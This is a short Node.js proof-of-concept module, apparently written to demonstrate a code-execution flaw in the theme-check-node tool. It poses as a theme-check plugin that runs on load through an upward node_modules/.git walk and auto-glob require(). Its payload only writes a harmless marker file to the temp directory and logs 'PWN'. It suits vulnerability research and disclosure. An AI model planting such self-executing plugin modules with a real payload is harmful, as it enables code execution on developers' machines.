const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const markerPath = path.join(os.tmpdir(), 'theme_rce_marker_1337.txt');
const payload =
  'THEME_RCE_MARKER_1337(scenario-B-upward-walk)' +
  ' | time=' + new Date().toISOString() +
  ' | pid=' + process.pid +
  ' | cwd=' + process.cwd() +
  ' | __filename=' + __filename +
  ' | parentPackageBeingLoadedBy=theme-check-node auto-glob require() (upward node_modules/.git walk)';

fs.writeFileSync(markerPath, payload + '\n', { flag: 'a' });

console.error('[theme-check-evil-up] PWN: executed via upward node_modules/.git walk + auto-glob require()');
console.error('[theme-check-evil-up] marker appended to: ' + markerPath);

module.exports = { checks: [] };
